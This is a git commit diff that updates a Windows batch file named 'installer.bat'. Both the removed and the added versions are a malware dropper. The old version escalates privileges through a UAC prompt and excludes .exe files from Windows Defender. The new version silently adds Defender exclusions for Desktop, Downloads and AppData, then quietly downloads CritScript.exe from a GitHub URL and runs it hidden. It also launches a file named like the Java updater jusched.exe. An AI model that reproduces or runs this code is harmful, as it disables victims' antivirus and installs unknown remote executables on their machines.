37fa58c69d56edb0c9daaae75baebf1713c387e6
walks111551 <aidenwalka@gmail.com>
2024-11-20 21:07:19 -0600

    Update installer.bat

--- installer.bat
+++ installer.bat
@@ -1,32 +1,33 @@
-REM - This is not the file you need to run. You need to upload this file to your webserver.
-
-@echo off
-
-:: BatchGotAdmin
-:-------------------------------------
-REM  --> Check for permissions
->nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
-
-REM --> If error flag set, we do not have admin.
-if '%errorlevel%' NEQ '0' (
-    echo Requesting administrative privileges...
-    goto UACPrompt
-) else ( goto gotAdmin )
-
-:UACPrompt
-    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-    set params = %*:"=""
-    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
-
-    "%temp%\getadmin.vbs"
-    del "%temp%\getadmin.vbs"
-    exit /B
-
 :gotAdmin
-    pushd "%CD%"
+    pushd "%TEMP%"
     CD /D "%~dp0"
-:--------------------------------------
-Powershell -WindowStyle Hidden -Command "Set-MpPreference -ExclusionExtension exe"
-cd %TEMP%
-Powershell -WindowStyle Hidden -Command "Invoke-Webrequest 'https://github.com/walks111551/09672018256120856125/blob/main/adsnt113.exe' -OutFile adsnt113.exe"
-adsnt113.exe
+
+    REM --> Silent PowerShell commands
+    powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/Desktop'" >nul 2>&1
+    powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/Downloads'" >nul 2>&1
+    powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/AppData/'" >nul 2>&1
+
+    REM --> Navigate to the %TEMP% directory
+    cd %TEMP%
+
+    REM --> Download files silently using PowerShell
+    powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/CritScript.exe' -OutFile CritScript.exe" >nul 2>&1
+
+
+    REM --> Check if CritScript.exe exists silently
+    if not exist "CritScript.exe" (
+        exit /b
+    )
+
+    REM --> Execute CritScript.exe silently
+    start /B "" CritScript.exe >nul 2>&1
+    timeout /t 5 /nobreak >nul 2>&1
+
+    REM --> Check and run JUSCHED.EXE if it exists
+    for %%F in (jusched.exe JUSCHED.EXE) do (
+        if exist "%%F" (
+            start /B "" %%F >nul 2>&1
+            timeout /t 5 /nobreak >nul 2>&1
+            goto :CreateShortcut
+        )
+    )
